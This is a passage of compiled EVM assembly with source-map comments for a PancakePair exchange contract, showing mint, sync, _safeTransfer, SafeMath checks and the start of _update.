amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      tag_214\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7247  amount0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7252:7264  _totalSupply */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7251  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7265  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7214:7346  Math.min(... */\n    tag_295:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7202:7346  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n    tag_294:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7386:7387  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7374:7383  liquidity */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7374:7387  liquidity > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7366:7432  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_300\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_300:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7467  freezeMint(to, liquidity) */\n      tag_301\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7453:7455  to */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7457:7466  liquidity */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7452  freezeMint */\n      tag_293\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7442:7467  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_301:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7527  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_221\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7486:7494  balance0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7496:7504  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7506:7515  _reserve0 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7517:7526  _reserve1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7485  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7478:7527  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_123:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":754:772  uint public taxfee */\n    tag_125:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n    tag_127:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_306\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_306:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18389:18393  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18502  _update(... */\n      tag_308\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18380  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18363:18369  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_309\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_309:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_310\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_310:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_311\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_311:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18442:18446  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18433  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18356:18395  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18416:18422  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_312\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_312:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_313\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_313:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_314\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_314:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18409:18448  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18462:18470  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18484:18492  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18342  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18335:18502  _update(... */\n      jump\t// in\n    tag_308:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18295:18509  function sync() external lock {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1700:2038  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_142:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":629:663  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      0x64\n      swap1\n      swap3\n      add\n      dup5\n      mstore\n        /* \"--CODEGEN--\":25:43   */\n      swap2\n      dup2\n      add\n        /* \"--CODEGEN--\":61:78   */\n      dup1\n      mload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"--CODEGEN--\":182:197   */\n      and\n      shl(0xe0, 0xa9059cbb)\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":160:209   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      swap3\n      mload\n      dup2\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1781:1793  bool success */\n      0x00\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1795:1812  bytes memory data */\n      0x60\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1826  token.call */\n      dup10\n      and\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1840:1883  abi.encodeWithSelector(SELECTOR, to, value) */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      swap2\n      dup3\n      swap2\n        /* \"--CODEGEN--\":25:43   */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      dup1\n      dup4\n        /* \"--CODEGEN--\":25:43   */\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_316:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_318\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_316)\n    tag_318:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1816:1893  token.call(... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_319)\n        /* \"--CODEGEN--\":16:47   */\n    tag_320:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_319:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1780:1893  (bool success, bytes memory data) = token.call(... */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1924:1931  success */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1924:1981  success && (data.length == 0 || abi.decode(data, (bool))) */\n      dup1\n      iszero\n      tag_322\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1947  data.length */\n      dup1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1952  data.length == 0 */\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1980  data.length == 0 || abi.decode(data, (bool)) */\n      tag_322\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1967:1971  data */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1956:1980  abi.decode(data, (bool)) */\n      dup1\n      0x20\n      add\n      swap1\n      mload\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_323:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1956:1980  abi.decode(data, (bool)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1936:1980  data.length == 0 || abi.decode(data, (bool)) */\n    tag_322:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1903:2031  require(... */\n      tag_324\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x18\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a205452414e534645525f4641494c45440000000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_324:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1700:2038  function _safeTransfer(address token, address to, uint value) private {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":481:630  function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_168:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":539:548  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:574  y == 0 */\n      dup2\n      iszero\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n      tag_326\n      jumpi\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":583:588  x * y */\n      dup1\n      dup3\n      mul\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":597:598  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":592:593  y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":583:588  x * y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":592:593  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":578:593  (z = x * y) / y */\n      tag_327\n      jumpi\n      invalid\n    tag_327:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":578:598  (z = x * y) / y == x */\n      eq\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":568:598  y == 0 || (z = x * y) / y == x */\n    tag_326:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":560:623  require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6d756c2d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_170:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2947:3930  function _update(... */\n    tag_179:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3132  balance0 <= uint112(-1) */\n      dup5\n      gt\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3159  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n      tag_332\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3136:3159  balance1 <= uint112(-1) */\n      dup4\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3109:3159  balance0 <= uint112(-1) && balance1 <= uint112(-1) */\n    tag_332:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3088:3202  require(... */\n      tag_333\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x11\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x78, 0x50616e63616b653a204f564552464c4f57)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_333:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3317:3335  blockTimestampLast */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3268  block.timestamp % 2 ** 32 */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3258  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3243:3268  block.timestamp % 2 ** 32 */\n      dup2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3317:3335  blockTimestampLast */\n      swap1\n      div\n      dup2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3300:3335  blockTimestamp - blockTimestampLast */\n      dup3\n      sub\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3387  timeElapsed > 0 */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3405  timeElapsed > 0 && _reserve0 != 0 */\n      tag_335\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3391:3405  _reserve0 != 0 */\n      dup5\n      and\n      iszero\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3405  timeElapsed > 0 && _reserve0 != 0 */\n    tag_335:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3423  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n      dup1\n      iszero\n      tag_336\n      jumpi\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3409:3423  _reserve1 != 0 */\n      dup4\n      and\n      iszero\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3372:3423  timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0 */\n    tag_336:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3368:3764  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n      iszero\n      tag_337\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3608:3619  timeElapsed */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3619  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      0xffffffff\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      tag_338\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3578:3587  _reserve0 */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3571  UQ112x112.encode(_reserve1) */\n      tag_339\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3561:3570  _reserve1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3560  UQ112x112.encode */\n      tag_340\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3571  